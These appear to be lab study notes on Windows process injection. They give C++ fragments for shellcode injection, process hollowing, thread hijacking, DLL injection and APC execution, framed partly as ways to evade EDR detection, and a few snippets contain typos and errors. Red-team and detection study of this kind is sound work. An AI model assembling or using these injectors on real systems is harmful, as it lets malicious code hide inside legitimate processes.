# [[Windows Internals#Processes|Processes]]
Process injection is commonly used as a an overarching term to describe injecting malicious code into a process through legitimate functionality or components.

| **Injection Type**                                                               | **Function**                                                                  |
| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)              | Inject code into a suspended and “hollowed” target process                    |
| [Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)     | Inject code into a suspended target thread                                    |
| [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/) | Inject a DLL into process memory                                              |
| [Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/)  | Self-inject a PE image pointing to a malicious function into a target process |
There are many other forms of process injection outlined by [MITRE T1055](https://attack.mitre.org/techniques/T1055/).
At its most basic level, process injection takes the form of shellcode injection.
1. Open a target process with all access rights
2. Allocate target process memory for the shellcode
3. Write shellcode to allocated memory in the target process
4. Execute the shellcode using a remote thread
![[Pasted image 20240814031257.png]]
At step one of shellcode injection, we need to open a target process using special parameters. `OpenProcess` is used to open the target process supplied via the command-line
```cpp
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```
At step two, we must allocate memory to the byte size of the shellcode. Memory allocations is handled using `VirtualAllocEx`. Within the call, the `dwSize` parameter is defined using the `sizeof` function to get the bytes of shellcode to allocate
```cpp
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```
At step three, we can now use the allocated memory region to write our shellcode. `WriteProcessMemory` is commonly used to write to memory regions.
```cpp
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```
At step four, we now have control of the process, and our malicious code is now written to memory. To execute the shellcode residing in memory, we can use `CreateRemoteThread`.
```cpp
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```
We can compile these steps together to create a basic process injector. Now we simply execute the program and give it a PID as an argument to inject our shellcode into.

# Process Hollowing
Similar to shellcode injection, this technique offers the ability to inject an entire malicious file into a process. This is accomplished by "hollowing" or un-mapping the process and injecting specific PE data and sections into the process.
At a high-level process hollowing can be broken up into
1. Create a target Process in a suspended state
2. Open a malicious image
3. Un-map legitimate code from process memory
4. Allocate memory locations for malicious code and write each section into the address space
5. Set an entry point for the malicious code
6. Take the target process out of a suspended state
![[Pasted image 20240814035254.png]]
At step one of process hollowing, we must create a target process in a suspended state using `CreateProcessA`. To obtain the required parameters for the [[Windows API|API]] call we can use the structures `STARTUPINFOA` and `PROCESS_INFORMATION`
```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
	(LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
	NULL,
	NULL,
	NULL,
	TRUE, // Handles are inherited from the calling process
	CREATE_SUSPENDED, // New process is suspended
	NULL,
	NULL,
	target_si, // pointer to startup info
	target_pi) == 0) { // pointer to process information
	cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
	return 1;
```
In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using `CreateFileA` to obtain a handle for the malicious image.

```cpp
HANDLE hMaliciousCode = CreateFileA(
	(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
	GENERIC_READ, // Read-only access
	FILE_SHARE_READ, // Read-only share mode
	NULL,
	OPEN_EXISTING, // Instructed to open a file or device if it exists
	NULL,
	NULL
);
```

Once a handle for the malicious image is obtained, memory must be allocated to the local process using `VirtualAlloc`. `GetFileSize` is also used to retrieve the size of the malicious image for `dwSize`.

```cpp
DWORD maliciousFileSize = GetFileSize(
	hMaliciousCode, // Handle of malicious image
	0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
	NULL,
	maliciousFileSize, // File size of malicious image
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x04 // Enables read/write access (PAGE_READWRITE)
);
```

Now that memory is allocated to the local process, it must be written. Using the information obtained from previous steps, we can use `ReadFile` to write to local process memory.

```cpp
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
	hMaliciousCode, // Handle of malicious image
	pMaliciousImage, // Allocated region of memory
	maliciousFileSize, // File size of malicious image
	&numberOfBytesRead, // Number of bytes read
	NULL
	)) {
	cout << "[!] Unable to read Malicious file into memory. Error: " <<GetLastError()<< endl;
	TerminateProcess(target_pi->hProcess, 0);
	return 1;
}

CloseHandle(hMaliciousCode);
```

At step three, the process must be “hollowed” by un-mapping memory. Before un-mapping can occur, we must identify the parameters of the API call. We need to identify the location of the process in memory and the entry point. The CPU registers `EAX` (entry point), and `EBX` (PEB location) contain the information we need to obtain; these can be found by using `GetThreadContext`. Once both registers are found, `ReadProcessMemory` is used to obtain the base address from the `EBX` with an offset (`0x8`), obtained from examining the PEB.

```cpp
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress; 
ReadProcessMemory(
	target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
	(PVOID)(c.Ebx + 8), // Pointer to the base address
	&pTargetImageBaseAddress, // Store target base address 
	sizeof(PVOID), // Bytes to read 
	0 // Number of bytes out
);
```

After the base address is stored, we can begin un-mapping memory. We can use `ZwUnmapViewOfSection` imported from _ntdll.dll_ to free memory from the target process.

```cpp
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
	hNtdllBase, // Handle of ntdll
	"ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress // Base address of the process
);
```

At step four, we must begin by allocating memory in the hollowed process. We can use `VirtualAlloc` similar to _step two_ to allocate memory. This time we need to obtain the size of the image found in file headers. `e_lfanew` can identify the number of bytes from the DOS header to the PE header. Once at the PE header, we can obtain the `SizeOfImage` from the Optional header.

```cpp
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	sizeOfMaliciousImage, // Byte size obtained from optional header
	0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
	0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);
```

Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we must first write the PE headers then the PE sections. To write PE headers, we can use `WriteProcessMemory` and the size of headers to determine where to stop.

```cpp
if (!WriteProcessMemory(
	target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
	pTargetImageBaseAddress, // Base address of the process
	pMaliciousImage, // Local memory where the malicious file resides
	pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
	NULL
)) {
	cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}
```

Now we need to write each section. To find the number of sections, we can use  `NumberOfSections` from the NT headers. We can loop through `e_lfanew` and the size of the current header to write each section.

```cpp
for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

	WriteProcessMemory(
		target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
		pSectionHeader->SizeOfRawData, // Byte size of current section
		NULL
	);
}
```

It is also possible to use relocation tables to write the file to target memory. This will be discussed in more depth in task 6.

At step five, we can use `SetThreadContext` to change `EAX` to point to the entry point.

```cpp
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context structure pointer to the entry point from the PE optional header

SetThreadContext(
	target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
	&c // Pointer to the stored context structure
);
```

At step six, we need to take the process out of a suspended state using `ResumeThread`.

```cpp
ResumeThread(
	target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
```
We can compile these steps together to create a process hollowing injector.

# Thread Injector
Thread execution can be broken up into
1. Locate and open a target process to control
2. Allocate memory region for malicious code
3. Write malicious code to allocated memory
4. Identify the thread ID of the target thread to hijack
5. Open the target thread
6. Suspend the target thread
7. Obtain the thread context
8. Update the instruction pointer to the malicious code
9. Rewrite the target thread context
10. Resume the hijacked thread
We will break down a basic thread hijacking script to identify each of the steps and explain in more depth below.
The first three steps outlined in this technique follow the same steps as normal process injection
```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
PVOIF remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```
On step four, we need to begin the process of hijacking the process thread by identifying the thread ID. To identify the thread ID we need to use a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Thread32First()` and `Thread32Next()`. These API calls will collectively loop through a snapshot of a process and extend capabilities to enumerate process information.
```cpp
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
	TH32CS_SNAPTHREAD, // Include all processes residing on the system
	0 // Indicates the current process
);
Thread32First( // Obtains the first thread in the snapshot
	hSnapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
	snapshot, // Handle of the snapshot
	&threadEntry // Pointer to the THREADENTRY32 structure
)) {
```
At step five, we have gathered all the require information in the structure pointer and can open the target thread. To pen the thread we will use `OpenThread` with the `THREADENTRY32` structure pointer
```cpp
	if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
		{
			HANDLE hThread = OpenThread(
				THREAD_ALL_ACCESS, // Requests all possible access rights
				FALSE, // Child threads do not inheret parent thread handle
				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
			);
			break;
		}
	}
```
At step six, we must suspend the opened target thread. To suspend the thread we can use `SuspendThread`
```cpp
SuspendThread(hThread);
```
Step seven, We need to obtain the thread context to use in the upcoming API calls. This can be done using `GetThreadContext` to store a pointer
```cpp
CONTEXT context;
GetThreadContext(
	hThread, // Handle for the thread 
	&context // Pointer to store the context structure
);
```
Step eight, We need to overwrite RIP (Instruction Pointer Register) to point to our malicious region of memory. RIP is an x64 register that will determine the next code instruction, it controls the flow of an application in memory. To overwrite the register we can update th thread context for RIP
```cpp
context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
```
At step nine, the context is updated and needs to be updated to the current thread context. This can be easily done using `SetThreadContext` and the pointer for the context
```cpp
SetThreadContext{
	hThread, // Handle for the thread
	&context // Pointer to the context structure
}
```
At the final step, we can take the target thread out of a suspended state. To accomplish this we can use `ResumeThread`.
```cpp
ResumeThread(
	hThread // Handle for the thread
);
```
Compiling all these steps, creates a process injector via thread hijacking.

# DLL Injection
1. Locate a target process to inject
2. Open the target process
3. Allocate memory region for malicious DLL
4. Write the malicious DLL to allocated memory
5. Load and execute the malicious DLL
At step one. we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Process32First()` and `Process32Next()`
```cpp
DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
		TH32CS_SNAPPROCESS, // Include all processes residing on the system
		0 // Indicates the current process
		);
    if (hSnapshot) {
	    PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
	    entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
        if (Process32First( // Obtains the first process in the snapshot
			hSnapshot, // Handle of the snapshot
			&entry // Pointer to the PROCESSENTRY32 structure
			)) {
            do {
                if (!strcmp( // Compares two strings to determine if the process name matches
					entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
					processName // Supplied process name
					)) { 
                    return entry.th32ProcessID; // Process ID of matched process
                }
            } while (Process32Next( // Obtains the next process in the snapshot
					hSnapshot, // Handle of the snapshot
					&entry
					)); // Pointer to the PROCESSENTRY32 structure
        }
    }
}
DWORD processId = getProcessId(processName); // Stores the enumerated process ID
```
At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: `GetModuleHandle`, `GetProcAddress`, or `OpenProcess`
```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Requests all possible access rights
	FALSE, // Child processes do not inheret parent process handle
	processId // Stored process ID
);
```
At step three, memory must be allocated for the provided malicious DLL to reside. As with most injectors, this can be accomplished using `VirtualAllocEx`
```cpp
LPVOID dllAllocatedMemory = VirtualAllocEx(
	hProcess, // Handle for the target process
	NULL, 
	strlen(dllLibFullPath), // Size of the DLL path
	MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```
At step four, we need to write the malicious DLL to the allocated memory location. We can use `WriteProcessMemory` to write the allocated region.
```cpp
WriteProcessMemory(
	hProcess, // Handle for the target process
	dllAllocatedMemory, // Allocated memory region
	dllLibFullPath, // Path to the malicious DLL
	strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
	NULL
);
```
At step five, our malicious DLL is written to memory and all we need to do is load and execute it. To load the DLL we need to use `LoadLibrary`, imported from `kernel32` once loaded, `CreateRemoteThread` can be used to execute memory using `LoadLibrary` as the starting function.
```cpp
LPVOID loadLibrary = (LPVOID) GetProcAddress(
	GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
	"LoadLibraryA" // API call to import
);
HANDLE remoteThreadHandler = CreateRemoteThread(
	hProcess, // Handle for the target process
	NULL, 
	0, // Default size from the execuatable of the stack
	(LPTHREAD_START_ROUTINE) loadLibrary, // pointer to the starting function
	dllAllocatedMemory, // pointer to the allocated memory region
	0, // Runs immediately after creation
	NULL
);
```
Compiling these will create a DLL injector

# Memory Execution Alternatives
Depending on the environment we are placed in, we may need to alter the way that we execute our shellcode. This could occur when there are hooks on an API call and we cannot evade or unhook them, an EDR is monitoring threads, etc.
Up to this point, we have used methods of allocating and writing data to and from local/remote processes. Execution is also a vital step in any injection technique, although not as important when attempting to minimize memory artifacts and IOCs (Indicators of Compromise). Unlike allocating and writing data, execution has many options to choose from.
We have used execution through `CreateThread` and `CreateRemoteThread`, but we can use others
## Invoking Function Pointers
The void function pointer is a method of memory block execution that relies solely on typecasting.
This technique can only be executed with locally allocated memory but does not rely on any API calls or other system functionality.
The following One-Liner, is the most common form of the void function pointer
```cpp
((void(*)())addressPointer)();
```
Now, this firstly create a function pointer `(void(*)())`. Then, we cast the allocated memory pointer or shellcode array into the function pointer `(<function pointer>)addressPointer`. And finally Invoke the function pointer to execute the shellcode `();`.
Although with a very specific use case, this technique can prove to be very evasive and helpful.

## Asynchronous Procedure Calls
An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread. 
An APC function is queued to a thread through `QueueUserAPC`. Once queued the APC function results in a software interrupt and executes the function the next time the thread is scheduled.
In order for a userland/user-mode application to queue an PC function the thread must be in an "alertable state". An alertable state requires the thread to be waiting for a callback such as `WaitForSingleObject` or `Sleep`.

We can use `VirtualAllocEx` and `WriteProcessMemory` for allocating and writing to memory.
```c
QueueUserAPC(
	(PAPCFUNC)addressPointer, // APC function pointer to allocated memory defined by winnt
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	(ULONG_PTR)NULL
	);
ResumeThread(
	pinfo.hThread // Handle to thread from PROCESS_INFORMATION structure
);
WaitForSingleObject(
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	INFINITE // Wait infinitely until alerted
);
```
This technique is a great alternative to thread execution, but it has recently gained traction in detection engineering and specific traps are being implemented for APC abuse. Still a great option depending on the detection measures we are facing.

## Section manipulation
A commonly seen technique in malware research is PE and section manipulation. 
For any section manipulation technique, we need to obtain a PE dump. Commonly accomplished with a DLL or other malicious file fed into `xxd`.
At the core of each method, it is using math to move through the physical hex data which is translated to PE data. 
Some of the more commonly known techniques include RVA entry point parsing, section mapping, and relocation table parsing.







